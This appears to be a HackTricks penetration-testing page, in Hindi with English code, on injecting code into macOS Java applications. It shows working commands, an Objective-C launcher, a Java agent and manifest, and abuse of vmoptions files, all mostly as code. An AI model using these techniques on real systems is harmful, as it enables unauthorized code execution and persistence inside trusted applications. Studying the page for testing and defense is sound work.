# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

अपने system में installed Java applications खोजें। यह देखा गया है कि **Info.plist** में Java apps में कुछ Java parameters होते हैं, जिनमें **`java.`** string शामिल होती है, इसलिए आप इसे search कर सकते हैं:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Environment variable **`_JAVA_OPTIONS`** का उपयोग Java application शुरू होने पर arbitrary Java VM parameters inject करने के लिए किया जा सकता है।<sup>[[1]](#references)</sup>

Java launch stack अलग-अलग scopes वाली दो अधिक स्पष्ट रूप से परिभाषित variables को भी पहचानता है:

- `JAVA_TOOL_OPTIONS` को VM create होने पर पढ़ा जाता है, जिसमें कुछ embedded launch paths भी शामिल हैं जो `java` launcher से होकर नहीं गुजरते। यह `-javaagent`, `-agentlib` या `-agentpath` जैसे instrumentation options inject कर सकता है।<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` को `java` launcher अपनी command line के आगे जोड़ता है। Main class चुनने या launcher को terminate करने वाले options निषिद्ध हैं, लेकिन `-javaagent` स्वीकार किया जाता है।<sup>[[5]](#references)</sup>

जब attacker के पास compatible readable agent भी हो, तो इन तीनों variables को JVM code-execution controls के रूप में माना जाना चाहिए। `_JAVA_OPTIONS` एक HotSpot implementation detail है, इसलिए इसे exact vendor और version के अनुसार validate करें; portable testing के लिए `JAVA_TOOL_OPTIONS` या `JDK_JAVA_OPTIONS` बेहतर हैं।
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
इसे current terminal की child process के रूप में नहीं, बल्कि एक नई process के रूप में execute करने के लिए आप इसका उपयोग कर सकते हैं:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
हालाँकि, वह technique executed application में एक error trigger करती है। एक अधिक stealthy alternative Java agent create करना और `-javaagent` का उपयोग करना है:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Application से **different Java version** के साथ agent बनाने पर agent और application दोनों crash हो सकते हैं।

Agent यहां हो सकता है:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Agent को compile करने के लिए चलाएँ:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` के साथ:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
और फिर env variable को export करें और java application को इस तरह चलाएँ:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

यह file Java को execute करते समय **Java parameters** निर्दिष्ट करने की सुविधा देती है। आप Java parameters को बदलने और **process से arbitrary commands execute करवाने** के लिए पिछली कुछ techniques का उपयोग कर सकते हैं।\
इसके अलावा, यह file `include` directive के साथ **अन्य files को include** भी कर सकती है, इसलिए आप किसी included file को भी बदल सकते हैं।

और भी, कुछ Java apps एक से अधिक `vmoptions` files को **load** करेंगी।

Android Studio जैसे कुछ applications अपने **output में यह दर्शाते हैं कि वे इन files को कहाँ खोजते हैं**:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
यदि वे ऐसा नहीं करते हैं, तो आप इसकी जांच इस प्रकार कर सकते हैं:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
ध्यान दें कि इस उदाहरण में Android Studio **`/Applications/Android Studio.app.vmoptions`** को load करने का प्रयास करता है, एक ऐसी location जहां **`admin` group के किसी भी user के पास write access** है।

## References

- [1] [OpenJDK — `arguments.cpp` में `_JAVA_OPTIONS` parsing](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` package specification](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — JVM options और platform properties configure करना](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [`java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
